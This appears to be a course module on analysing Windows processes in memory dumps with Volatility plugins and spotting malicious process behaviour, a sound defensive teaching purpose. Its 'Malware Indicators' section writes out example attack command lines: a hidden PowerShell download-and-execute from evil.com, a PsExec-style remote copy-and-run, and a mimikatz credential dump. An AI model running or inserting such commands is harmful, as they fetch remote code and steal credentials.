# Process Analysis with Volatility

## Understanding Windows Processes

### What is a Process?
A **process** is an instance of a running program. Each process has:
- **Process ID (PID)**: Unique identifier
- **Parent Process ID (PPID)**: PID of process that created it
- **Image Name**: Executable filename (e.g., svchost.exe)
- **Memory Space**: Virtual address space (user + kernel)
- **Threads**: Execution units within the process
- **Handles**: Open files, registry keys, mutexes, sockets

### Process Creation Hierarchy
```
System (PID 4)
└── smss.exe (Session Manager)
    └── csrss.exe (Client/Server Runtime)
    └── wininit.exe
        └── services.exe (Service Control Manager)
            └── svchost.exe (multiple instances)
            └── spoolsv.exe
            └── ... (other services)
    └── winlogon.exe
        └── userinit.exe
            └── explorer.exe (Windows Shell)
                └── chrome.exe
                └── notepad.exe
                └── ... (user applications)
```

**Key Insight**: Parent-child relationships are forensically significant. Suspicious examples:
- `cmd.exe` parent of `powershell.exe` parent of `mimikatz.exe` (credential dumping)
- `winword.exe` parent of `powershell.exe` (malicious macro)
- `explorer.exe` parent of `svchost.exe` (unusual - svchost should be child of services.exe)

## Core Process Analysis Plugins

### 1. windows.pslist
**Purpose**: List all active processes (walks EPROCESS linked list)

**Command:**
```bash
vol -f memory.dmp windows.pslist
```

**Output Columns:**
- **PID**: Process ID
- **PPID**: Parent Process ID (who created this process)
- **ImageFileName**: Executable name
- **Offset**: Virtual memory offset of EPROCESS structure
- **Threads**: Number of threads
- **Handles**: Number of open handles
- **SessionId**: Session ID (0 = system, 1+ = user sessions)
- **Wow64**: True if 32-bit process on 64-bit Windows
- **CreateTime**: When process started
- **ExitTime**: When process terminated (N/A if still running)

**Example Output:**
```
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime                      ExitTime
4       0       System          0x82341920      123     890     N/A             False   2024-01-15 10:30:00.000000      N/A
412     4       smss.exe        0x85d7a8c0      2       30      N/A             False   2024-01-15 10:30:01.000000      N/A
540     532     csrss.exe       0x86d2e920      12      500     0               False   2024-01-15 10:30:05.000000      N/A
```

**What to Look For:**
- ❌ Processes with PPID = 0 (orphaned - parent died)
- ❌ Processes with suspicious names (e.g., svchost.exe with one 's' missing: svchosts.exe)
- ❌ Processes in wrong directories (calc.exe in C:\Temp instead of C:\Windows\System32)
- ❌ Processes with unusual PPID (notepad.exe parent of cmd.exe - code injection?)

**Use Cases:**
- Quick triage: What was running on the system?
- Timeline: When did malware start executing?
- Baseline: Compare against known-good process list

### 2. windows.pstree
**Purpose**: Display process hierarchy (parent-child tree)

**Command:**
```bash
vol -f memory.dmp windows.pstree
```

**Output Format:**
```
* 4    0       System  2024-01-15 10:30:00.000000
** 412 4       smss.exe        2024-01-15 10:30:01.000000
*** 540        532     csrss.exe       2024-01-15 10:30:05.000000
**** 1234      540     malware.exe     2024-01-15 14:25:30.000000  (SUSPICIOUS)
```

**Advantages over pslist:**
- Visual hierarchy makes suspicious relationships obvious
- Easier to spot process injection
- Reveals malware persistence mechanisms

**Example: Detecting Code Injection**
```
explorer.exe (PID 1500)
├── chrome.exe (PID 2000)  ← Normal
├── notepad.exe (PID 2100)  ← Normal
└── cmd.exe (PID 2200)  ← SUSPICIOUS (explorer shouldn't spawn cmd.exe)
    └── powershell.exe (PID 2300)  ← VERY SUSPICIOUS
        └── mimikatz.exe (PID 2400)  ← MALWARE
```

### 3. windows.psscan
**Purpose**: Scan physical memory for EPROCESS structures (finds hidden/unlinked processes)

**Command:**
```bash
vol -f memory.dmp windows.psscan
```

**Why Needed:**
- `pslist` walks the EPROCESS linked list (easy for rootkits to unlink)
- `psscan` scans ALL memory for EPROCESS signatures (finds hidden processes)

**Example: Finding Hidden Rootkit**
```bash
# pslist output (normal processes only)
vol -f memory.dmp windows.pslist

# psscan output (includes hidden process)
vol -f memory.dmp windows.psscan | grep rootkit.exe
```

**Red Flags:**
- Process in psscan but NOT in pslist (DKOM - Direct Kernel Object Manipulation)
- Process with ExitTime in psscan but still running (hiding from process list)

**Use Cases:**
- Rootkit detection
- Finding terminated processes (forensic timeline)
- Detecting DKOM (Direct Kernel Object Manipulation)

### 4. windows.cmdline
**Purpose**: Extract command-line arguments for each process

**Command:**
```bash
vol -f memory.dmp windows.cmdline
```

**Output Example:**
```
PID     Process                 Args
1234    powershell.exe         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <base64>
5678    cmd.exe                cmd.exe /c whoami && net localgroup administrators
```

**Forensic Value:**
- Reveals attacker commands (e.g., `net user`, `mimikatz`)
- Shows lateral movement tools (e.g., `psexec`, `wmic`)
- Exposes persistence mechanisms (e.g., scheduled tasks, registry modifications)

**Malware Indicators:**
```bash
# Base64-encoded PowerShell (obfuscation)
powershell.exe -EncodedCommand <base64_string>

# Fileless malware (downloads and executes in memory)
powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"

# Lateral movement (PsExec-style)
cmd.exe /c copy \\victim\C$\Windows\Temp\malware.exe && \\victim\C$\Windows\Temp\malware.exe

# Credential dumping (Mimikatz)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Use Cases:**
- Incident response: What commands did the attacker run?
- Malware analysis: How did malware spread?
- Insider threat: What files did the employee access?

### 5. windows.dlllist
**Purpose**: List all DLLs loaded by each process

**Command:**
```bash
vol -f memory.dmp windows.dlllist --pid <PID>
```

**Output Example:**
```
PID     Process                 Base    Size    Name                            Path
1234    notepad.exe             0x00400000      0x6000      notepad.exe             C:\Windows\System32\notepad.exe
1234    notepad.exe             0x77320000      0x1af000    ntdll.dll               C:\Windows\System32\ntdll.dll
1234    notepad.exe             0x75e10000      0x1ab000    kernel32.dll            C:\Windows\System32\kernel32.dll
1234    notepad.exe             0x12340000      0x5000      evil.dll                C:\Temp\evil.dll  ← SUSPICIOUS
```

**What to Look For:**
- ❌ DLLs loaded from non-standard paths (C:\Temp, C:\Users\Public)
- ❌ DLLs with suspicious names (kernel33.dll instead of kernel32.dll)
- ❌ DLLs not signed by Microsoft (verify with sigcheck)
- ❌ DLLs injected into legitimate processes (e.g., evil.dll in notepad.exe)

**Use Cases:**
- DLL injection detection
- Malware persistence (DLL hijacking)
- API hooking detection

### 6. windows.handles
**Purpose**: List all open handles (files, registry keys, mutexes, events)

**Command:**
```bash
vol -f memory.dmp windows.handles --pid <PID>
```

**Output Example:**
```
PID     Process                 Offset          HandleValue     Type            Name
1234    malware.exe             0x88ac7f10      0x4c            File            \Device\HarddiskVolume2\Users\victim\passwords.txt
1234    malware.exe             0x88ac8020      0x50            Mutant          Global\MalwareMutex
1234    malware.exe             0x88ac8130      0x54            Key             \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

**Forensic Value:**
- **Mutexes**: Malware uses mutexes to prevent multiple instances (mutex name often unique to malware family)
- **File handles**: What files is malware reading/writing?
- **Registry handles**: What registry keys is malware modifying (persistence)?
- **Socket handles**: What network connections is malware maintaining?

**Malware Mutex Examples:**
```
Emotet: Global\I5O2V1D3
WannaCry: Global\MsWinZonesCacheCounterMutexA
Ryuk: Global\{8761ABBD-7F85-42EE-B272-A76179687C63}
```

**Use Cases:**
- Malware family identification (via mutex names)
- Persistence mechanism detection (registry key handles)
- Data exfiltration (file handle analysis)

## Advanced Process Analysis Techniques

### Technique 1: Process Hollowing Detection
**What is Process Hollowing?**
Malware creates a legitimate process (e.g., svchost.exe) in suspended state, hollows out its memory, injects malicious code, then resumes execution.

**Detection with Volatility:**
```bash
# Step 1: Find suspicious processes
vol -f memory.dmp windows.pslist | grep svchost.exe

# Step 2: Check for code injection (malfind)
vol -f memory.dmp windows.malfind --pid <svchost_PID>

# Step 3: Dump process memory
vol -f memory.dmp windows.memmap --pid <svchost_PID> --dump
```

**Red Flags:**
- svchost.exe with unusual PPID (should be services.exe)
- svchost.exe with PAGE_EXECUTE_READWRITE memory (suspicious)
- svchost.exe with shellcode patterns in memory

### Technique 2: PPID Spoofing Detection
**What is PPID Spoofing?**
Attacker creates process with fake parent process ID to blend in (e.g., making malware.exe appear to be child of services.exe)

**Detection:**
```bash
# Step 1: Get process tree
vol -f memory.dmp windows.pstree

# Step 2: Verify PPID relationships
# If malware.exe shows PPID = services.exe (PID 500)
# But services.exe has no such child in tree → PPID spoofing
```

**Known Attack Tools:**
- CobaltStrike: Uses PPID spoofing to evade detection
- Metasploit: PPID spoofing via `migrate` command

### Technique 3: Token Manipulation Detection
**What is Token Manipulation?**
Attacker steals security token from privileged process (e.g., SYSTEM) to escalate privileges

**Detection:**
```bash
# Step 1: List processes with their tokens
vol -f memory.dmp windows.privileges

# Step 2: Look for suspicious token privileges
# Example: notepad.exe with SeDebugPrivilege (should only be SYSTEM processes)
```

**Red Flags:**
- User-mode process with SYSTEM token
- Process with too many privileges (e.g., cmd.exe with SeDebugPrivilege)

## Process Forensics Workflow

### Step 1: Initial Triage
```bash
# Get overview of running processes
vol -f memory.dmp windows.pslist > pslist.txt

# Count total processes
cat pslist.txt | wc -l

# Look for unusual process counts
# Normal Windows 10: 80-120 processes
# If 300+ processes: possible process injection or malware
```

### Step 2: Suspicious Process Identification
```bash
# Check for misspelled system processes
cat pslist.txt | grep -i "svch0st\|lsas\|csrs"

# Check for processes in wrong directories
vol -f memory.dmp windows.cmdline | grep -v "C:\\Windows\\System32"

# Check for hidden processes
vol -f memory.dmp windows.psscan > psscan.txt
diff pslist.txt psscan.txt  # Processes in psscan but not pslist = hidden
```

### Step 3: Process Tree Analysis
```bash
# Visualize parent-child relationships
vol -f memory.dmp windows.pstree > pstree.txt

# Look for unusual hierarchies
# Example: explorer.exe → cmd.exe → powershell.exe → malware.exe
grep -A5 "explorer.exe" pstree.txt
```

### Step 4: Command-Line Analysis
```bash
# Extract all command lines
vol -f memory.dmp windows.cmdline > cmdlines.txt

# Search for malicious commands
grep -i "mimikatz\|psexec\|net user\|whoami" cmdlines.txt

# Search for encoded PowerShell
grep -i "encodedcommand" cmdlines.txt
```

### Step 5: DLL Injection Detection
```bash
# For each suspicious process, list DLLs
vol -f memory.dmp windows.dlllist --pid <PID> > dlls_<PID>.txt

# Check for DLLs in unusual locations
grep -v "C:\\Windows\\System32" dlls_<PID>.txt

# Check for unsigned DLLs
# (Requires manual verification with sigcheck or VirusTotal)
```

## Common Process-Related IOCs (Indicators of Compromise)

### System Processes (Should ALWAYS be in C:\Windows\System32)
- **System** (PID 4) - Kernel process, PPID 0
- **smss.exe** - Session Manager, PPID 4
- **csrss.exe** - Client/Server Runtime, PPID smss.exe
- **wininit.exe** - Windows Initialization, PPID smss.exe
- **services.exe** - Service Control Manager, PPID wininit.exe
- **svchost.exe** - Service Host, PPID services.exe
- **lsass.exe** - Local Security Authority, PPID wininit.exe
- **winlogon.exe** - Windows Logon, PPID smss.exe
- **explorer.exe** - Windows Shell, PPID userinit.exe

### Suspicious Process Behaviors
```
❌ svchost.exe NOT child of services.exe (process hollowing or impersonation)
❌ csrss.exe NOT in C:\Windows\System32 (malware disguise)
❌ lsass.exe with unusual command-line arguments (credential dumping)
❌ powershell.exe with -EncodedCommand (obfuscated malware)
❌ cmd.exe spawned by Microsoft Office apps (malicious macros)
❌ Any .exe in C:\Users\AppData\Local\Temp (common malware staging area)
```

## Key Takeaways

1. **pslist** = Quick overview of running processes
2. **pstree** = Visualize parent-child relationships (detect code injection)
3. **psscan** = Find hidden processes (rootkit detection)
4. **cmdline** = See what commands were executed
5. **dlllist** = Detect DLL injection
6. **handles** = Find malware mutexes and persistence mechanisms

**Golden Rule**: Verify PPID, path, command-line, and digital signature for every suspicious process.

## What's Next?

- **Module 04**: Network analysis and malware C2 detection
- **Module 05**: Advanced malware detection with Malfind
- **Module 06**: Registry forensics and persistence mechanisms

---

**Reference**: "The Art of Memory Forensics" by Michael Hale Ligh et al. (2014)
